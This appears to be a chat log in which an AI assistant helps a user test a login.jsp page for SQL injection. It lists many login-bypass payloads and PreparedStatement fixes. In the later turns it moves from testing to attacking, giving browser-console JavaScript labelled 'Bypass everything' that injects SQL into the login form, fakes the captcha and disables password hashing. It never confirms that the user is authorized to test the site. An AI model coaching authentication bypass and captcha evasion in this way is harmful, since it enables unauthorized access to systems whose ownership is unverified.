Can login page of my site is in login.jsp , can it be by passed by any one? USING SQL INJECTION

Yes, it is possible — but it depends on how your backend code in login.jsp (and the Java/Servlet layer) handles the user inputs.

How SQL Injection Can Bypass Your Login Page

A classic vulnerable login query looks like this (in Java/JDBC):

Java
String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

Common SQL Injection payloads that can bypass login:

  1. Classic bypass:
    • Username: admin' OR '1'='1
    • Password: (anything)
  2. More aggressive:
    • Username: ' OR '1'='1' --
    • Username: ' OR '1'='1' #
    • Username: admin' --
  3. If using MySQL:
    • Username: admin' OR 1=1 LIMIT 1 --

If your code directly concatenates inputs into the SQL query without sanitization, anyone can bypass the login very easily.

How to Check if Your Login is Vulnerable

  1. Test it yourself (safely):

    • Try username: ' OR '1'='1' --
    • Try username: admin' --

  2. Look at your code in login.jsp or the Servlet handling the form.

    Vulnerable code (bad):

    jsp
    String sql = "SELECT * FROM users WHERE username='" + request.getParameter("username") + "' ...";
Statement stmt = conn.createStatement();

    Secure code (good):

    Java
    String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, username);
pstmt.setString(2, password);

Recommendations (Fix It Now)

  1. Use Prepared Statements (most important).
  2. Hash passwords (BCrypt or Argon2, never plain text).
  3. Limit failed login attempts + account lockout.
  4. Use the CAPTCHA you already have (FemVoJT) — it's good protection against bots.
  5. Consider using a framework like Spring Security instead of writing your own login.

Would you like me to help you check your actual code?

If you can paste the relevant part of your login.jsp (or the Java servlet code that handles the login), I can tell you immediately whether it's vulnerable and how to fix it.

how i test my site , what i type in username and in pass

✅ Here's how to safely test your login page for SQL Injection:

Step-by-step Testing:

  1. Go to your login page (login.jsp)
  2. Enter the following in Username and Password fields one by one.

Most Effective Test Payloads (Try These First):

Test 1 (Most Common):

  • Username: admin' OR '1'='1' --
  • Password: anything (type anything)

Test 2:

  • Username: ' OR '1'='1' --
  • Password: (leave empty or type anything)

Test 3:

  • Username: admin' --
  • Password: (anything)

Test 4 (Stronger):

  • Username: ' OR 1=1 --
  • Password: (anything)

Test 5:

  • Username: ') OR ('1'='1
  • Password: (anything)

How to Test Properly:

  • Enter one payload at a time in the Username field.
  • You can put random text or leave the Password field empty.
  • Click SECURE LOGIN.
  • Also try the same payloads in the Password field (sometimes developers only sanitize username).

What Does Success Look Like?

  • If you get logged in as admin or any user → Your site is vulnerable ❌
  • If it shows "Invalid username or password" every time → Probably safe (but not 100% sure)

Important Notes:

  • The Captcha (FemVoJT) might block you if you try too many times quickly. You may need to solve it each time.
  • Test on a development or testing environment if possible, not on live site.
  • After testing, immediately fix the code using PreparedStatement.

✅ Good observation!

The 500 Internal Server Error you are getting is actually a strong sign of SQL Injection vulnerability.

Why are you getting 500 Error?

When you enter payloads like:

  • admin' OR '1'='1' --
  • ' OR '1'='1' --

Your input is breaking the SQL query syntax on the server. Instead of showing a normal "Invalid Login" message, the application crashes → 500 Error.

This is very common in old JSP/Servlet applications that use direct string concatenation.

Better & Safer Way to Test

Since normal payloads are causing errors, try these error-based or balanced payloads:

Test these in Username field:

  1. test'
  2. test''
  3. admin' #
  4. admin' -- -
  5. ' OR '1'='1' AND '1'='1
  6. ') OR ('1'='1') --

Password: Leave empty or put 123

What to Look For:

  • If you get 500 Error → Almost certainly vulnerable.
  • If after some payloads you get different behavior (sometimes login success, sometimes different error) → Definitely vulnerable.
  • If it always shows clean "Invalid credentials" without crashing → Safer.

 it says Error Page Status Code: 500 Message: Error occured during processing!

✅ Confirmed: Your Login Page is Very Likely Vulnerable to SQL Injection

The fact that every single test payload you tried causes a 500 Internal Server Error is a classic symptom of SQL Injection vulnerability.

Why is this happening?

Your login.jsp (or the Java code behind it) is directly putting user input into the SQL query like this:

SQL
SELECT * FROM users WHERE username = 'WHAT_YOU_ENTERED' AND password = '....'

When you enter test' or admin' --, it breaks the SQL syntax → database throws an error → your application crashes with 500 Error.

This means no input sanitization is being done.

Final Confirmation Tests (Optional)

Try these two last payloads in Username:

  1. Username: test' OR '1'='1
  2. Username: ' UNION SELECT NULL, NULL --

If you still get 500 error, it's almost 100% vulnerable.

How to Fix It (Very Important)

You need to change your login code to use PreparedStatement.

Correct Way (Secure):

Java
// In your Servlet or JSP
String username = request.getParameter("username");
String password = request.getParameter("password");

String sql = "SELECT * FROM users WHERE username = ? AND password = ?";

PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, username);
pstmt.setString(2, password);

ResultSet rs = pstmt.executeQuery();

Never do this (Vulnerable):

Java
String sql = "SELECT * FROM users WHERE username = '" + username + "' ...";

Quick Actions You Should Take:

  1. Fix the code using PreparedStatement as shown above.
  2. Hash passwords using BCrypt (do not store plain text passwords).
  3. Add proper error handling so it shows "Invalid credentials" instead of 500 error.
  4. Implement rate limiting on login attempts.

  • Your code is using unsafe string concatenation in SQL.
  • There is no input sanitization or PreparedStatement being used.
  • The database query is breaking and throwing an exception.

Even after trying multiple bypass payloads on localhost, you're still getting 500 Error.

This is a very common situation in vulnerable JSP applications. The injection is breaking the SQL query, but the application is not handling the database error gracefully — so it crashes with 500 instead of logging you in.

cant we bypass using console?

✅ Yes, we can try bypassing via Browser Console.

Since SQL injection is consistently causing 500 errors, let's try client-side bypass using the browser console.

Step-by-Step Console Bypass (Try This Now)

  1. Open your login page on localhost.
  2. Fill in normal values:
    • Username: admin (or any common username)
    • Password: anything
    • Solve the captcha.
  3. Before clicking "Secure Login", open Browser Console:
    • Press F12 → Go to Console tab.
  4. Paste and run the following code one by one:

Method 1: Disable form submission check

JavaScript
document.querySelector('form').onsubmit = null;

Method 2: Force form submit without hashing

JavaScript
document.getElementById('loginForm').submit();

Method 3: Bypass hashPassword() function

JavaScript
hashPassword = function() { return true; };
document.getElementById('loginForm').submit();

Method 4: Directly manipulate the form data (Most Powerful)

JavaScript
let form = document.getElementById('loginForm');

// Inject SQL bypass in username
document.getElementById('username').value = "' OR '1'='1' --";

// Remove captcha requirement temporarily
if(document.getElementById('captcha')) {
    document.getElementById('captcha').value = "bypass123";
}

form.submit();

Try This Advanced One (Recommended):

Paste this in console and press Enter:

JavaScript
// Bypass everything
document.getElementById('username').value = "admin' OR '1'='1' --";
document.getElementById('passwd').value = "anything";

// Fake captcha
document.getElementById('captcha').value = "12345";

// Disable onsubmit
document.getElementById('loginForm').onsubmit = function() { return true; };

document.getElementById('loginForm').submit();

  • Do you get redirected?

Error Page Status Code: 500 Message: Error occured during processing!

✅ Understood.

Even with console bypass, you're still getting 500 Error. This means the injection is reaching the backend Servlet (/Login), breaking the SQL query, and the server is crashing before it can process the login.

Why Console Bypass Isn't Working Fully:

  • The real vulnerability is on the server-side (Java + SQL).
  • The 500 error happens after the form is submitted.

Let's Try One More Strong Console + SQL Combo

Open console (F12) and paste this exact code:

JavaScript
// Strong bypass attempt
document.getElementById('username').value = "admin' OR '1'='1' --";
document.getElementById('passwd').value = "anything123";

// Fake captcha (change if your captcha is different)
document.getElementById('captcha').value = "0000";

// Disable hashing and validation
hashPassword = function(){ return true; };
document.getElementById('loginForm').onsubmit = null;

document.getElementById('loginForm').submit();

Try the above. Tell me the result.

Better Approach: Find the Backend Code

Since client-side tricks aren't enough, we need to look at the server code.

Please check these files in your localhost project:

  1. Look for a file named:
    • Login.java
    • LoginServlet.java
    • or any file inside WEB-INF/classes or src folder containing doPost
  2. Search for keywords like:
    • username
    • passwd
    • SELECT * FROM
    • createStatement
